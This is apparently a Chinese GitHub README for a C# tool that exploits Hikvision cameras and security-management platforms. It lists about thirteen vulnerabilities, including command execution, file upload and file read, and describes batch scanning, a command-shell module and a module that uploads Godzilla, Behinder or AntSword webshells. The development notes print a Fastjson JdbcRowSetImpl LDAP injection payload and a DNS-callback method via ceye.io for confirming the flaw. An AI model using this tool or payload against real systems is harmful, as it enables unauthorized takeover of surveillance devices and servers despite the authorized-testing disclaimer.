# Hikvision综合漏洞利用工具

没事写个工具，
程序采用C#开发,
首次使用请安装依赖：
NET8.0
声明：仅用于授权测试，用户滥用造成的一切后果和作者无关
请遵守法律法规！

https://dotnet.microsoft.com/zh-cn/download

海康威视综合漏洞利用工具 收录漏洞如下：

Hikvision 摄像头未授权访问漏洞

Hikvision 远程代码执行漏洞

Hikvision iVMS综合安防系统任意文件上传漏洞

Hikvision综合安防管理平台isecure center文件上传漏洞

Hikvision综合安防管理平台config信息泄露漏洞

Hikvision综合安防管理平台env信息泄漏漏洞

Hikvision综合安防管理平台report任意文件上传漏洞

Hikvision综合安防管理平台api session命令执行漏洞

Hikvision applyCT命令执行漏洞

Hikvision applyAutoLoginTicket命令执行漏洞

Hikvision keepAlive远程代码执行漏洞

Hikvision综合安防管理平台orgManage任意文件读取漏洞

Hikvision综合安防管理平台files任意文件读取漏洞

# 功能介绍

批量检测模块：

模块如下：Hikvision 远程代码执行漏洞

Hikvision iVMS综合安防系统任意文件上传漏洞

Hikvision综合安防管理平台isecure center文件上传漏洞

Hikvision综合安防管理平台config信息泄露漏洞

Hikvision综合安防管理平台api session命令执行漏洞

Hikvision综合安防管理平台env信息泄漏漏洞

Hikvision applyAutoLoginTicket命令执行漏洞

webshell利用模块
Hikvision iVMS综合安防系统任意文件上传漏洞

Hikvision综合安防管理平台isecure center文件上传漏洞

Hikvision综合安防管理平台report任意文件上传漏洞

cmshell命令执行模块
Hikvision 远程代码执行漏洞

Hikvision综合安防管理平台api session命令执行漏洞

Hikvision applyAutoLoginTicket命令执行漏洞

# 功能使用

默认模块可一键扫描所有漏洞

![image](https://github.com/MInggongK/Hikvision-/blob/main/e10adc3949ba59abbe56e057f20f883e.jpg)

选择模块可单独选择你要检测的模块，输入目标，点击选择模块即可检测漏洞

批量检测内置路径：/hikvision.txt
hikvision.txt文本放入你要检测的网站列表
默认批量检测，批量扫描所有模块的漏洞

选择模块，可单独选择你要检测的模块，点击选择模块即可

Cmdshell模块：
选择模块进行漏洞验证，如果存在，在cmdshell输入你要执行的命令即可

webshell利用模块：

内置Godzilla
Behinder
AntSword
cmd
四种类型的shell
一个测试文件

具体使用方法：选择模块进行验证
如isecure center
如果漏洞存在
可选择内置类型，如测试文件
点击getshell isecure上传即可



自定义上传
如果存在isecure漏洞
可自定义shell代码，
选择自定义模块
如自定义isecure
填入你要的shell代码，文件名，如demo.jsp
点击自定义上传即可

# 编写小记
Hikvision applyCT ceye api精准识别技巧
目前已取消，考虑到批量识别可能会阻塞网络，因此没有采取这个方法
{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://"\",\"autoCommit\":true},\"hfe4zyyzldp\":\"=\"}
默认
默认插入POST json数据进行测试
访问api:
查找id:
id	"1870408864"
这里存在一个问题
如果dns缓存不清除，可能存在误判
{"meta": {"code": 200, "message": "OK"}, "data": [{"id": "1870408864", "name": "", "remote_addr": 
这里会造成误判，DNS缓存清除需要cookie
那么怎么不使用COOKIE解决这个问题呢？
可以直接在调用前，产生随机数
   Random random = new Random();
    int randomNumber = random.Next(1, 100); // 生成一个1到100之间的随机整数
   Console.WriteLine(randomNumber);
然后进行拼接：然后直接赋给   randomNumber + "." + textBox4.Text;
这样每一次生成都是会递增的循环产生随机数
如9090.38.22.xxxx.ceye.io
2222.9090.38.22.xxxx.ceye.io
3422342.9090.38.22.xxxx.ceye.io
通过访问API token,会查找ID值进行判断
http://api.ceye.io/v1/records?token=“token&type=dns&filter=
  if (s.Contains(3422342.9090.38.22.xxxx.ceye.io))
   {
比对发出的请求：
如96.93.13.4.90.38.22.2skv3a.ceye.io
没发出一次，自动生成1次，这样就判断精准了
取随机不断的递增，再递增去比较存在的值
如果找到，就存在漏洞，否则漏洞不存在
但是这个只适用于单个识别，批量识别还需要写另外验证方法

# 更新日志

Hikvision综合漏洞利用工具 v1.7版
增加了批量指纹识别功能
默认识别Server识别
set-Cookie识别
放入你要检测的批量网站，点击识别即可
![image](https://github.com/MInggongK/Hikvision-/blob/main/gjdfgdg.jpg)

增加了Hikvision综合安防管理平台orgManage任意文件读取漏洞检测（含批量检测）
增加了Hikvision综合安防管理平台files任意文件读取漏洞检测（含批量检测）
感谢ling1uan提到的issues问题，修复了report漏洞构造请求体的Bug











